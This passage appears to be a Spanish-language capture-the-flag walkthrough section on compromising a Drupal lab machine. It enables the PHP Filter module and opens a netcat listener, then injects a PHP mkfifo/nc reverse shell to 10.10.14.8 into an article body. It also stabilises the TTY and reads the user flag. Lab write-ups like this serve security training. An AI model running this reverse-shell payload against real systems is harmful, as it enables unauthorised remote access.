## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion por Druppal {-}

Para ejecutar comandos o mejor dicho, para ganar accesso al sistema desde un admin panel de drupal siempre es el mismo.

1. En modules, habilitar el componente PHP Filter

    ```{r, echo = FALSE, fig.cap="Drupal - habilitar PHP Filter", out.width="90%"}
    knitr::include_graphics("images/drupal-phpfilter.png")
    ```

1. Crear un nuevo contenido

    ```{r, echo = FALSE, fig.cap="Drupal - Nuevo articulo", out.width="90%"}
    knitr::include_graphics("images/drupal-new-article.png")
    ```

1. Ponernos en escucha en el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En drupal añadir en el body

    ```php
    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f"); ?>
    ```

1. En Text Format le ponemos a **PHP code**
1. Le damos al boton Preview

Ya hemos ganado accesso al sistema como el usuario *www-data*

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos la maquina {-}

```bash
ls -l
cd /home
ls
cd /daniel
cat user.txt
```

Aqui encontramos un usuario **daniel** y tenemos derechos de escritura. Ya podemos visualizar la flag. Lo mas probable aqui
seria de convertirnos directamente en el usuario root.

